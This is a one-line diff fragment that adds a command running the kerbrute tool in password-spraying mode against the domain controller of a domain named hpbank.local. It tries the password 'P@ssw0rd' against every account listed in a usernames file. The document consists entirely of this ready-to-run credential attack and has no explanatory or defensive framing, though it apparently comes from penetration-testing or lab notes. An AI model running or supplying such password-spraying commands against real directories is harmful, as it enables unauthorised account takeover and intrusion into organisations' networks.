@@ -1,0 +1,1 @@
+kerbrute_windows_amd64.exe passwordspray -d hpbank.local --dc dc01.hpbank.local usernames.txt P@ssw0rd
